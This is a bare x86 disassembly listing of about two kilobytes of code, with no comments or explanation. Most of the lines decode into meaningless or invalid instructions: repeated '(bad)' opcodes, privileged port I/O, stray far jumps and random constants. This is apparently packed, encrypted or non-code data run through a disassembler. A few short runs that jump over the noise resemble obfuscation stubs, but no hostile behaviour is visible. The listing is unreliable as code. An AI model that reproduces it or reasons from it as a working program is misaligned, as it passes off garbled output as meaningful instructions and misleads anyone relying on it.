  4020c4:	fisubr DWORD PTR [ebx+0x1]
  4020c7:	inc    edi
  4020c8:	cmc    
  4020c9:	icebp  
  4020ca:	das    
  4020cb:	int3   
  4020cc:	adc    BYTE PTR [ecx+esi*1+0x4e],dh
  4020d0:	xchg   edx,eax
  4020d1:	lea    esi,[ecx+0x681546d5]
  4020d7:	leave  
  4020d8:	jnp    0x402136
  4020da:	add    DWORD PTR [edi+ecx*8],eax
  4020dd:	or     BYTE PTR [eax-0x4a],bl
  4020e0:	gs cmp al,0xc5
  4020e3:	inc    ecx
  4020e4:	adc    bh,BYTE PTR [eax+0x61]
  4020e7:	mov    ds:0x4de83c06,al
  4020ec:	(bad)  
  4020ed:	pusha  
  4020ee:	(bad)
  4020f1:	mov    DWORD PTR [ecx+0x24],ebp
  4020f4:	cli    
  4020f5:	mov    al,0xaf
  4020f7:	clc    
  4020f8:	inc    ebx
  4020f9:	(bad)  
  4020fa:	sbb    eax,0x9f7e0035
  4020ff:	cli    
  402100:	and    DWORD PTR [edi-0x3c],edi
  402103:	fmul   DWORD PTR [ecx+edx*1-0x188bb41a]
  40210a:	cs sahf 
  40210c:	dec    ecx
  40210d:	stc    
  40210e:	in     al,dx
  40210f:	cmp    eax,0x7e83e07e
  402114:	ds mov ecx,0xd8f2a205
  40211a:	ins    DWORD PTR es:[edi],dx
  40211b:	push   eax
  40211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40211d:	adc    DWORD PTR [esp+edx*8],0xfffffff4
  402121:	mov    edx,0xc9685e96
  402126:	retf   0xdd6
  402129:	xchg   ebp,eax
  40212a:	out    dx,al
  40212b:	sbb    dl,BYTE PTR [ebx+0x45]
  40212e:	(bad)  
  40212f:	imul   edi,DWORD PTR [edx-0x74b28feb],0x1c3c26ba
  402139:	and    al,0xae
  40213b:	sbb    eax,0x67405e34
  402140:	pop    ds
  402141:	nop
  402142:	push   0xffffff8c
  402144:	jmp    0xbefb76c0
  402149:	xlat   BYTE PTR ds:[ebx]
  40214a:	cmp    BYTE PTR [edi],ah
  40214c:	or     BYTE PTR [eax+0xc06b844],bh
  402152:	xor    BYTE PTR [edx-0x2b21f4f8],0x80
  402159:	mov    dh,0x99
  40215b:	push   esp
  40215c:	imul   eax
  40215e:	inc    ebp
  40215f:	mov    ds:0x40ad1312,eax
  402164:	add    al,0x98
  402166:	adc    al,0x28
  402168:	mov    ds:0xef80c1b6,eax
  40216d:	aaa    
  40216e:	jo     0x40219a
  402170:	sub    ecx,esi
  402172:	dec    edi
  402173:	push   eax
  402174:	and    eax,0xf76f82d6
  402179:	or     DWORD PTR [edi-0x17],esi
  40217c:	jnp    0x4021fd
  40217e:	pop    ecx
  40217f:	xchg   ebp,eax
  402180:	jmp    0x40218b
  402182:	xchg   esi,eax
  402183:	jnp    0x402122
  402185:	dec    ecx
  402186:	stc    
  402187:	xor    al,0xcd
  402189:	or     ah,BYTE PTR ds:0x582ae851
  40218f:	rol    BYTE PTR [esi],cl
  402191:	push   esi
  402192:	adc    edi,edx
  402194:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434449
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4326f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	inc    ecx
  4021bb:	pop    edi
  4021bc:	lea    ebp,[ebp+0x52]
  4021bf:	add    al,0x70
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x40220a
  4021c7:	(bad)
  4021ca:	fs mov al,0x62
  4021cd:	sub    BYTE PTR [eax-0x7e],ch
  4021d0:	mov    al,ds:0xa9425c09
  4021d5:	add    al,0x3c
  4021d7:	mov    bl,0x8a
  4021d9:	mov    DWORD PTR [edx+0x27],ebp
  4021dc:	mov    dl,0xe1
  4021de:	sbb    eax,0xbc13463f
  4021e3:	xor    ecx,esp
  4021e5:	nop
  4021e6:	out    0x85,al
  4021e8:	(bad)  
  4021e9:	mov    esi,0x41441e7a
  4021ee:	stos   BYTE PTR es:[edi],al
  4021ef:	mov    ch,ah
  4021f1:	pushf  
  4021f2:	ins    DWORD PTR es:[edi],dx
  4021f3:	arpl   WORD PTR [esi-0x7c],si
  4021f6:	(bad)  
  4021f8:	inc    ebx
  4021f9:	ins    DWORD PTR es:[edi],dx
  4021fa:	push   esi
  4021fb:	dec    ebp
  4021fc:	xchg   BYTE PTR [ebx],bh
  4021fe:	bound  ecx,QWORD PTR [esi]
  402200:	cmp    ebx,DWORD PTR [ecx]
  402202:	jbe    0x402243
  402204:	cmp    DWORD PTR [ebx-0x74b28042],edx
  40220a:	mov    ecx,0xfd6ef3b2
  40220f:	dec    ebx
  402210:	inc    ebx
  402211:	sbb    esi,edx
  402213:	fcomp  DWORD PTR [ecx+0x42]
  402216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402217:	aad    0x39
  402219:	aam    0xdc
  40221b:	pushw  0xffb3
  40221e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40221f:	sub    al,0x75
  402221:	idiv   BYTE PTR [ecx-0x2b]
  402224:	mov    bh,0xe8
  402226:	mul    DWORD PTR [ecx]
  402228:	aaa    
  402229:	and    DWORD PTR [esi+edx*4],0x12
  40222d:	nop
  40222e:	leave  
  40222f:	cs leave 
  402231:	mov    ah,0xce
  402233:	aaa    
  402234:	xlat   BYTE PTR ds:[ebx]
  402235:	leave  
  402236:	imul   eax,DWORD PTR fs:[ebx+0x5e],0x7e
  40223b:	test   DWORD PTR [ecx],esi
  40223d:	mov    ecx,0x942539a7
  402242:	add    ecx,0x84136959
  402248:	dec    ebx
  402249:	pop    ds
  40224a:	gs mov edi,edi
  40224d:	pop    edi
  40224e:	das    
  40224f:	hlt    
  402250:	shr    BYTE PTR [eax],1
  402252:	sbb    al,0x92
  402254:	clc    
  402255:	mov    dh,0xfc
  402257:	sbb    al,0xc0
  402259:	and    BYTE PTR [ebx],ch
  40225b:	sbb    al,0x78
  40225d:	outs   dx,DWORD PTR ds:[esi]
  40225e:	retf   
  40225f:	jecxz  0x4022bd
  402261:	inc    ebp
  402262:	(bad)  
  402263:	cld    
  402264:	mov    dl,0x9a
  402266:	mov    ah,0xf3
  402268:	aaa    
  402269:	cmp    eax,DWORD PTR [edx*1-0x14afc830]
  402270:	mov    dl,0xbd
  402272:	inc    ecx
  402273:	scas   eax,DWORD PTR es:[edi]
  402274:	out    0xe6,eax
  402276:	aaa    
  402277:	sub    esi,eax
  402279:	dec    ebp
  40227a:	sub    eax,0xe7313b56
  40227f:	push   0x482c75f7
  402284:	inc    eax
  402285:	dec    ebx
  402286:	data16 gs jns 0x402240
  40228a:	fiadd  WORD PTR [esi-0x1]
  40228d:	cmp    BYTE PTR [esi],ah
  40228f:	in     al,0xea
  402291:	mov    ebp,0x68cbbdbc
  402296:	mov    WORD PTR [ecx],?
  402298:	xchg   ebp,eax
  402299:	repz lock cmp cl,BYTE PTR [eax+0x5c8d5bb0]
  4022a1:	adc    al,0x39
  4022a3:	shl    BYTE PTR [eax-0x3],1
  4022a6:	rcl    BYTE PTR [edx-0x70],cl
  4022a9:	cmp    edx,DWORD PTR ds:0x2e7d2ae0
  4022af:	stos   DWORD PTR es:[edi],eax
  4022b0:	ret    0xb352
  4022b3:	into   
  4022b4:	add    BYTE PTR [eax],0xf4
  4022b7:	ret    0x1096
  4022ba:	scas   eax,DWORD PTR es:[edi]
  4022bb:	dec    ebx
  4022bc:	push   ecx
  4022bd:	jl     0x4022cb
  4022bf:	or     edi,DWORD PTR [edi]
  4022c1:	inc    DWORD PTR [esi]
  4022c3:	ds in  eax,dx
  4022c5:	call   0x6c6c:0x4074686b
  4022cc:	(bad)
  4022d1:	arpl   WORD PTR [ebp+0x63],dx
  4022d4:	jo     0x4022d9
  4022d6:	push   ss
  4022d7:	and    DWORD PTR ds:0x955d6f95,esi
  4022dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	or     al,0x34
  4022e0:	fidivr DWORD PTR [eax-0x73]
  4022e3:	les    ebp,FWORD PTR [ecx+0x12]
  4022e6:	in     eax,0x3a
  4022e8:	cmp    ebx,DWORD PTR [esi+0x5e2260b]
  4022ee:	or     al,dh
  4022f0:	cmp    eax,0xd8a6203e
  4022f5:	jo     0x4022d3
  4022f7:	adc    ebx,ebx
  4022f9:	in     al,0x98
  4022fb:	mov    cl,0x7
  4022fd:	push   ss
  4022fe:	cmc    
  4022ff:	dec    cl
  402301:	and    DWORD PTR [esi-0x59],0x54c3e5b
  402308:	xchg   esi,eax
  402309:	cmp    edi,ebp
  40230b:	ror    BYTE PTR [ecx-0x17],cl
  40230e:	inc    ebx
  40230f:	mov    esi,edx
  402311:	je     0x4022a3
  402313:	pop    edx
  402314:	xchg   esi,eax
  402315:	clc    
  402316:	xchg   eax,edi
  402318:	cli    
  402319:	sub    BYTE PTR [ecx-0x373bda1c],ah
  40231f:	push   es
  402320:	or     ch,BYTE PTR [esp-0x5f]
  402324:	out    dx,eax
  402325:	sbb    ebp,eax
  402327:	(bad)  
  402328:	adc    DWORD PTR [ebp+0x42b5292e],ecx
  40232e:	sbb    edx,esp
  402330:	fidivr DWORD PTR [esp+ecx*4-0x4d]
  402334:	inc    esp
  402335:	in     al,dx
  402336:	jns    0x40234a
  402338:	jmp    0x402346
  40233a:	repnz pop ss
  40233c:	daa    
  40233d:	pop    ebp
  40233e:	jo     0x4022c8
  402340:	jg     0x402360
  402342:	mov    edi,DWORD PTR [ebx-0x31]
  402345:	rcr    DWORD PTR [eax-0x607c8efe],0x6c
  40234c:	jp     0x4023b0
  40234e:	(bad)  
  40234f:	jnp    0x4023cd
  402351:	or     al,BYTE PTR [edx-0x145d9b63]
  402357:	cwde   
  402358:	inc    ecx
  402359:	adc    bl,dh
  40235b:	cmp    bh,BYTE PTR ds:0xc2c16920
  402361:	fmul   QWORD PTR ss:0xeeb8ca11
  402368:	int    0x16
  40236a:	cmp    bh,BYTE PTR [ebx]
  40236c:	xor    DWORD PTR [edi+0x1d45fad6],esi
  402372:	fwait
  402373:	shl    DWORD PTR [edi],0x79
  402376:	popa   
  402377:	cmp    BYTE PTR [esi],cl
  402379:	xchg   ebp,edi
  40237b:	jl     0x40235b
  40237d:	iret   
  40237e:	lea    ebx,[edi+ebx*4-0x75]
  402382:	in     al,dx
  402383:	mov    dh,0x4a
  402385:	xchg   ebx,eax
  402386:	in     eax,dx
  402387:	dec    edi
  402388:	rol    BYTE PTR [ebp+0x4f],1
  40238b:	call   0xf854:0xc0ccd003
  402392:	daa    
  402393:	adc    DWORD PTR [esi+ecx*2-0x3a],esp
  402397:	cwde   
  402398:	xor    esi,ebp
  40239a:	sub    cl,cl
  40239c:	(bad)  
  40239d:	neg    BYTE PTR [ecx+0x61899e15]
  4023a3:	outs   dx,BYTE PTR ds:[esi]
  4023a4:	jmp    0x828b:0x1f7b49be
  4023ab:	adc    esi,DWORD PTR [edi-0x1]
  4023ae:	xor    DWORD PTR [ebp+ebx*8+0x14d7eb25],ebx
  4023b5:	int3   
  4023b6:	(bad)  
  4023b7:	jmp    esi
  4023b9:	jp     0x4023b5
  4023bb:	push   esi
  4023bc:	out    0x56,al
  4023be:	xchg   esi,eax
  4023bf:	xchg   ebx,eax
  4023c0:	xor    eax,0x3f2d1753
  4023c5:	out    dx,eax
  4023c6:	xchg   ebp,eax
  4023c7:	jns    0x4023ea
  4023c9:	lahf   
  4023ca:	mov    ebp,0x38ddd926
  4023cf:	pushf  
  4023d0:	mov    ch,0xae
  4023d2:	dec    ecx
  4023d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023d4:	jo     0x4023af
  4023d6:	mov    bl,BYTE PTR [ebx+0x7e67bd8]
  4023dc:	in     al,0x8e
  4023de:	pushf  
  4023df:	fnsave [esi+0x25]
  4023e2:	xlat   BYTE PTR ds:[ebx]
  4023e3:	pushf  
  4023e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023e5:	scas   eax,DWORD PTR es:[edi]
  4023e6:	fadd   st(0),st
  4023e8:	sbb    eax,0xf4689f92
  4023ed:	retf   0x5ee7
  4023f0:	stos   BYTE PTR es:[edi],al
  4023f1:	and    BYTE PTR [esi],bl
  4023f3:	test   eax,0x8e2fbc88
  4023f8:	mov    bh,0x19
  4023fa:	sbb    al,0xa4
  4023fc:	push   cs
  4023fd:	jg     0x4023b0
  4023ff:	and    eax,0x395720f1
  402404:	or     BYTE PTR [esi],cl
  402406:	jl     0x402454
  402408:	(bad)  
  402409:	(bad)  
  40240a:	or     DWORD PTR [esi],esi
  40240c:	xor    bh,BYTE PTR ds:0xe49a287d
  402412:	fisubr DWORD PTR [ebx]
  402414:	jmp    0x4023d3
  402416:	add    esp,DWORD PTR [ebx-0x509ddbcc]
  40241c:	add    DWORD PTR [ecx],ebx
  40241e:	(bad)  
  40241f:	rol    BYTE PTR [esi+0x153c9cad],1
  402425:	xchg   ecx,eax
  402426:	test   eax,0x68e8ed8c
  40242b:	pop    esp
  40242c:	ror    ebp,1
  40242e:	mov    bl,0xb0
  402430:	popa   
  402431:	inc    ebp
  402432:	push   di
  402434:	mov    ecx,ecx
  402436:	rcr    DWORD PTR [ebp-0x6a],1
  402439:	fsubp  st(7),st
  40243b:	sub    ebx,DWORD PTR [eax+ebx*2-0x2a]
  40243f:	nop
  402440:	scas   eax,DWORD PTR es:[edi]
  402441:	jecxz  0x40248d
  402443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402444:	cli    
  402445:	ja     0x4024a5
  402447:	xor    DWORD PTR [esi-0x6d2a98c1],esp
  40244d:	scas   al,BYTE PTR es:[edi]
  40244e:	push   es
  40244f:	ror    DWORD PTR [edi+0x6d547043],cl
  402455:	or     al,0xa5
  402457:	jge    0x4023eb
  402459:	hlt    
  40245a:	inc    esi
  40245b:	imul   esi,ebp,0x4d7ffa5f
  402461:	data16 in al,0xf9
  402464:	inc    ebx
  402465:	xchg   esi,eax
  402466:	and    DWORD PTR [ebx+0x69819993],ebp
  40246c:	adc    di,WORD PTR ds:0xb9b9fe57
  402473:	push   ecx
  402474:	or     DWORD PTR [ecx-0x4ea70fbe],0xffffff80
  40247b:	adc    bh,dl
  40247d:	(bad)  
  40247e:	les    esp,FWORD PTR [esi+0x23300c3a]
  402484:	in     al,dx
  402485:	jbe    0x402421
  402487:	aad    0xec
  402489:	je     0x4024da
  40248b:	retf   
  40248c:	ret    
  40248d:	retf   
  40248e:	sbb    eax,0x8babbe4e
  402493:	(bad)  
  402494:	out    dx,al
  402495:	(bad)  
  402496:	sbb    DWORD PTR [eax-0x1f],esi
  402499:	xor    bl,BYTE PTR [ebp-0x2e93bb62]
  40249f:	jge    0x402448
  4024a1:	imul   edx,DWORD PTR [ebp-0x1a69c3f1],0xdd3a6620
  4024ab:	int    0xd
  4024ad:	scas   eax,DWORD PTR es:[edi]
  4024ae:	or     esp,ebp
  4024b0:	ret    
  4024b1:	ret    0x68cb
  4024b4:	jb     0x40252d
  4024b6:	aaa    
  4024b7:	lds    ebx,FWORD PTR [ecx-0x318e6a53]
  4024bd:	in     al,0x79
  4024bf:	out    dx,eax
  4024c0:	scas   eax,DWORD PTR es:[edi]
  4024c1:	xor    eax,0x4157e859
  4024c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024c7:	mov    WORD PTR [esi-0x602757cd],cs
  4024cd:	xchg   esp,eax
  4024ce:	or     eax,0x926f9b47
  4024d3:	add    bh,BYTE PTR [ecx+0x531603a8]
  4024d9:	aaa    
  4024da:	sub    bl,BYTE PTR [ebx+edx*2+0x6aa244dd]
  4024e1:	cmp    BYTE PTR [edx-0x5d30239f],dl
  4024e7:	sub    al,0x25
  4024e9:	adc    ch,BYTE PTR [edx-0x5]
  4024ec:	outs   dx,BYTE PTR ds:[esi]
  4024ed:	test   al,0x5
  4024ef:	mov    edx,0x463b89ec
  4024f4:	add    eax,0x5b06e3c4
  4024f9:	sbb    eax,0x1bc60193
  4024fe:	sar    DWORD PTR [ebx-0x2c4cea5f],1
  402504:	add    BYTE PTR [esi+0x7d],0x1d
  402508:	push   ebx
  402509:	jmp    0xbeaa987
  40250e:	mov    bh,0x77
  402510:	jg     0x402573
  402512:	inc    eax
  402513:	aad    0xfb
  402515:	nop
  402516:	pop    ss
  402517:	into   
  402518:	jl     0x402548
  40251a:	and    al,0x6e
  40251c:	out    dx,eax
  40251d:	cwde   
  40251e:	sub    cl,ah
  402520:	sub    al,0x1e
  402522:	push   0x526c74c6
  402527:	sub    al,0x89
  402529:	mov    eax,0x1ae7746b
  40252e:	dec    ebp
  40252f:	xlat   BYTE PTR ds:[ebx]
  402530:	shl    DWORD PTR ds:0x33dbe22,1
  402536:	fisubr DWORD PTR [esi+edi*1+0x337b34d5]
  40253d:	cdq    
  40253e:	not    BYTE PTR [ebp-0x561e8d9b]
  402544:	test   BYTE PTR [esi-0x1e],0x0
  402548:	add    edx,edi
  40254a:	or     al,0xfe
  40254c:	aad    0x68
  40254e:	aad    0xa2
  402550:	xchg   edx,eax
  402551:	mov    BYTE PTR gs:[ebp+0x6300d61a],bl
  402558:	(bad)  
  402559:	mov    ebp,DWORD PTR [esi-0x5f58c3c4]
  40255f:	mov    edx,DWORD PTR [ebp-0x8]
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	cdq    
  4025a3:	jbe    0x40254f
  4025a5:	dec    eax
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x40254e
  4025af:	push   ss
  4025b0:	sti    
  4025b1:	or     al,0x23
  4025b3:	(bad)  [esi+0xc]
  4025b6:	mov    ebx,0x92762409
  4025bb:	fwait
  4025bc:	pop    ebp
  4025bd:	mov    DWORD PTR [ebx+eiz*2-0x28],esp
  4025c1:	ret    
  4025c2:	push   es
  4025c3:	aaa    
  4025c4:	scas   al,BYTE PTR es:[edi]
  4025c5:	inc    ebx
  4025c6:	cld    
  4025c7:	and    eax,ebp
  4025c9:	scas   eax,DWORD PTR es:[edi]
  4025ca:	mov    esi,0x22996993
  4025cf:	cmp    BYTE PTR [edi-0x36c0b997],ch
  4025d5:	popa   
  4025d6:	loopne 0x40258a
  4025d8:	push   0xdb081462
  4025dd:	int3   
  4025de:	mov    ebp,0x91be58a4
  4025e3:	out    0x5d,eax
  4025e5:	and    edx,DWORD PTR [ebp+0x34]
  4025e8:	push   ebx
  4025e9:	jle    0x402590
  4025eb:	in     al,dx
  4025ec:	dec    edi
  4025ed:	mov    ecx,ebx
  4025ef:	popf   
  4025f0:	jns    0x4025d6
  4025f2:	mov    ?,WORD PTR cs:[edi-0x11]
  4025f6:	cmp    ch,ah
  4025f8:	pop    esp
  4025f9:	inc    ecx
  4025fa:	fldenv [esi-0x5e89564b]
  402600:	aad    0x3a
  402602:	pop    ebp
  402603:	fiadd  WORD PTR [ebx+0x47]
  402606:	sbb    dl,BYTE PTR [eax+ecx*1+0x1a]
  40260a:	aas    
  40260b:	sar    ah,cl
  40260d:	cld    
  40260e:	lods   al,BYTE PTR ss:[esi]
  402610:	push   es
  402611:	das    
  402612:	mov    dh,0x91
  402614:	scas   al,BYTE PTR es:[edi]
  402615:	push   ebx
  402616:	push   ss
  402617:	mov    ds:0x9b564591,al
  40261c:	or     DWORD PTR [esi+0x20],0xffffffb9
  402620:	inc    esp
  402621:	push   0xffffffe6
  402623:	dec    edi
  402624:	sub    al,0x82
  402626:	neg    BYTE PTR [edx-0x38b4b9f]
  40262c:	pop    ds
  40262d:	xor    cl,cl
  40262f:	cmc    
  402630:	jae    0x402612
  402632:	cld    
  402633:	and    DWORD PTR [ecx-0x32],edx
  402636:	ins    DWORD PTR es:[edi],dx
  402637:	hlt    
  402638:	jno    0x4026a7
  40263a:	jg     0x402615
  40263c:	fild   DWORD PTR [ebx+0x4c0f0169]
  402642:	imul   DWORD PTR [edx+0x490beea5]
  402648:	in     eax,dx
  402649:	fcomp  DWORD PTR [ecx+0x39d33f7d]
  40264f:	loopne 0x4025fe
  402651:	push   es
  402652:	xchg   esi,eax
  402653:	and    DWORD PTR [esp+ebp*4],ebp
  402656:	js     0x4026d7
  402658:	pushf  
  402659:	xchg   ecx,eax
  40265a:	or     DWORD PTR [edx],ecx
  40265c:	cdq    
  40265d:	inc    edi
  40265e:	into   
  40265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402660:	sti    
  402661:	(bad)  
  402662:	jle    0x402636
  402664:	stos   BYTE PTR es:[edi],al
  402665:	arpl   WORD PTR [eax],si
  402667:	js     0x402648
  402669:	loope  0x40266b
  40266b:	mov    cs,WORD PTR [eax]
  40266d:	cdq    
  40266e:	sub    eax,0x64eae0e2
  402673:	xchg   edi,eax
  402674:	gs push ebp
  402676:	sbb    al,0xa7
  402678:	stc    
  402679:	inc    esp
  40267a:	into   
  40267b:	mov    ch,0x8f
  40267d:	cld    
  40267e:	xchg   ebp,eax
  40267f:	sub    esp,DWORD PTR [edx-0xb1ee5cf]
  402685:	aas    
  402686:	mov    edx,0xd970634c
  40268b:	push   ebp
  40268c:	popf   
  40268d:	repnz cwde 
  40268f:	addr16 push edx
  402691:	imul   DWORD PTR [edi]
  402693:	outs   dx,BYTE PTR ds:[esi]
  402694:	jl     0x40268b
  402696:	sub    BYTE PTR [edx+0x13cd4c61],dl
  40269c:	xchg   esp,eax
  40269d:	ror    DWORD PTR [edx-0xbd06a5e],0x13
  4026a4:	adc    al,0x25
  4026a6:	cmp    BYTE PTR [ebx-0x7d],ah
  4026a9:	ja     0x4026aa
  4026ab:	ds push ss
  4026ad:	mov    edi,0xa6968bed
  4026b2:	ucomiss xmm3,DWORD PTR [esp+esi*2-0x7a528a08]
  4026ba:	pop    es
  4026bb:	fnsave ds:[edi+esi*8]
  4026bf:	ficomp WORD PTR [edi]
  4026c1:	outs   dx,BYTE PTR ds:[esi]
  4026c2:	popf   
  4026c3:	sbb    ebp,DWORD PTR ds:0x597732b2
  4026c9:	aaa    
  4026ca:	ins    DWORD PTR es:[edi],dx
  4026cb:	cdq    
  4026cc:	push   ebp
  4026cd:	(bad)  
  4026ce:	mov    bh,0x82
  4026d0:	shr    DWORD PTR [edx],cl
  4026d2:	push   eax
  4026d3:	aaa    
  4026d4:	ror    DWORD PTR [ecx],cl
  4026d6:	mov    BYTE PTR [ebp-0x70e1fdc6],ah
  4026dc:	loop   0x4026c0
  4026de:	sahf   
  4026df:	mov    edi,0xea113370
  4026e4:	cmp    eax,0xdfae2497
  4026e9:	mov    ecx,0xe7f4b99b
  4026ee:	push   eax
  4026ef:	imul   esi,DWORD PTR [edi-0x2a],0x43
  4026f3:	xor    DWORD PTR [edx],eax
  4026f5:	mov    BYTE PTR [ebx-0x49dd3b1f],ch
  4026fb:	mov    ds:0xe1d5e8ac,al
  402700:	je     0x402776
  402702:	push   ebx
  402703:	stos   DWORD PTR es:[edi],eax
  402704:	lock (bad) 
  402706:	mov    ah,0xd4
  402708:	push   edx
  402709:	scas   al,BYTE PTR es:[edi]
  40270a:	add    ah,dl
  40270c:	jb     0x40275c
  40270e:	pop    ss
  40270f:	leave  
  402710:	inc    eax
  402711:	jae    0x402712
  402713:	mov    ah,0x15
  402715:	aaa    
  402716:	lea    edx,[edx+ebx*4]
  402719:	inc    edi
  40271a:	adc    eax,0x6dda327f
  40271f:	mov    eax,0x3a5a102e
  402724:	fidiv  DWORD PTR ds:0xc260dc14
  40272a:	push   ebx
  40272b:	inc    edi
  40272c:	pop    edx
  40272d:	fwait
  40272e:	pop    ecx
  40272f:	cmp    eax,0x6a983e63
  402734:	dec    edi
  402735:	xor    BYTE PTR [edx+0x6],dl
  402738:	xchg   ebp,eax
  402739:	ins    BYTE PTR es:[edi],dx
  40273a:	pop    es
  40273b:	mov    ds:0xd8a42caa,al
  402740:	adc    ebx,DWORD PTR [edx]
  402742:	ds push esi
  402744:	adc    ah,BYTE PTR [eax-0x564b3817]
  40274a:	cs jmp 0x74cfcbee
  402750:	into   
  402751:	ret    0x3d21
  402754:	scas   eax,DWORD PTR es:[edi]
  402755:	pop    ss
  402756:	ja     0x402750
  402758:	xor    al,0x52
  40275a:	sub    ecx,0x33cf9cdf
  402760:	or     dl,dh
  402762:	jge    0x4027b7
  402764:	aaa    
  402765:	fsubr  QWORD PTR [eax-0x1925ebde]
  40276b:	sahf   
  40276c:	mov    ecx,0x655c4077
  402771:	mov    cl,0x2
  402773:	push   edi
  402774:	jmp    0x4027f0
  402776:	pop    esp
  402777:	mov    ebx,0xbc89a6fa
  40277c:	lods   al,BYTE PTR ds:[esi]
  40277d:	jp     0x40272e
  40277f:	push   edx
  402780:	xchg   DWORD PTR [edx-0x2518aa1c],esi
  402786:	xor    eax,0xf744a40d
  40278b:	push   esi
  40278c:	pop    edi
  40278d:	cmc    
  40278e:	mov    ss,WORD PTR [eax+0x48]
  402791:	sub    BYTE PTR [esi],ch
  402793:	sbb    dl,BYTE PTR [ebp+0x2e]
  402796:	(bad)  
  402797:	cld    
  402798:	adc    BYTE PTR [ebx-0x768bf55f],cl
  40279e:	lea    ebx,[ebx+0x74]
  4027a1:	jmp    0x78eb:0xbc82529b
  4027a8:	loop   0x402809
  4027aa:	sub    DWORD PTR [edi],edx
  4027ac:	popf   
  4027ad:	xchg   BYTE PTR [esi-0x66],bl
  4027b0:	jg     0x40273b
  4027b2:	adc    al,0x28
  4027b4:	dec    edx
  4027b5:	sub    dh,BYTE PTR [esi+0x3770f419]
  4027bb:	adc    eax,0xe29fdb0
  4027c0:	jnp    0x402747
  4027c2:	jl     0x40279a
  4027c4:	mov    DWORD PTR [edx+edi*2-0x3c],ecx
  4027c8:	pop    ebp
  4027c9:	adc    dh,BYTE PTR [ebx-0x2a]
  4027cc:	xor    ebp,edi
  4027ce:	ss pop ebp
  4027d0:	cmp    ecx,DWORD PTR [eax+0x6e]
  4027d3:	jns    0x4027a3
  4027d5:	mov    BYTE PTR [esi-0x65de1b2d],0x97
  4027dc:	sbb    DWORD PTR [ecx+0xfc1c393],ebp
  4027e2:	call   0x81e0:0x1bd3809c
  4027e9:	int    0x98
  4027eb:	xchg   ebx,eax
  4027ec:	or     al,0x48
  4027ee:	scas   al,BYTE PTR es:[edi]
  4027ef:	js     0x4027aa
  4027f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f2:	jp     0x402822
  4027f4:	mov    ds:0x174985e6,eax
  4027f9:	out    0xe3,eax
  4027fb:	push   edi
  4027fc:	int    0xad
  4027fe:	sub    DWORD PTR [eax],ebx
  402800:	scas   eax,DWORD PTR es:[edi]
  402801:	ret    0xb165
  402804:	scas   al,BYTE PTR es:[edi]
  402805:	push   ebx
  402806:	stos   DWORD PTR es:[edi],eax
  402807:	pop    ecx
  402808:	mov    ebp,0x2296ebb
  40280d:	push   ebx
  40280e:	or     eax,0x3ab369a4
  402813:	inc    ecx
  402814:	div    ch
  402816:	(bad)  
  402817:	(bad)  
  402818:	pop    ebp
  402819:	lea    ebx,[edx]
  40281b:	aaa    
  40281c:	add    dl,bl
  40281e:	gs mov bh,0x2c
  402821:	or     DWORD PTR [eax-0x3b],eax
  402824:	sbb    eax,0xff92fa83
  402829:	and    dh,BYTE PTR [edx]
  40282b:	mov    ch,0x19
  40282d:	push   ebx
  40282e:	sbb    ebx,DWORD PTR ds:0x92c815e
  402834:	xchg   esp,eax
  402835:	pusha  
  402836:	xor    DWORD PTR [ecx-0x3d9724a4],0x1341f377
  402840:	inc    esp
  402841:	cdq    
  402842:	cld    
  402843:	stos   BYTE PTR es:[edi],al
  402844:	cmp    al,0x2c
  402846:	push   ebp
  402847:	addr16 jle 0x4027cd
  40284a:	xchg   al,cl
  40284c:	inc    edx
  40284d:	lahf   
  40284e:	pop    ebx
  40284f:	sub    eax,0xc0077431
  402854:	loopne 0x402868
  402856:	xchg   ecx,eax
  402857:	sub    ecx,eax
  402859:	sub    eax,0xa434eb69
  40285e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40285f:	push   ebx
  402860:	mov    DWORD PTR [ecx],esi
  402862:	sub    BYTE PTR [ebx-0x6c884782],bl
  402868:	(bad)  
  402869:	cli    
  40286a:	cmc    
  40286b:	sahf   
  40286c:	jmp    0x2d755727
  402871:	cmp    BYTE PTR [ebx+0x42df37fd],ch
  402877:	mov    ebx,0xe174022a
  40287c:	xchg   edi,eax
  40287d:	out    dx,eax
  40287e:	jnp    0x4028f5
  402880:	xor    eax,0x1f23375e
  402885:	add    ebp,DWORD PTR [eax-0x28]
  402888:	push   eax
  402889:	push   esi
  40288a:	shl    DWORD PTR [ebx+ebx*1],1
  40288d:	sbb    cl,BYTE PTR ds:0xe4ed4b26
  402893:	xchg   DWORD PTR [eax],ecx
  402895:	cmp    eax,0x5107093a
  40289a:	out    dx,eax
  40289b:	das    
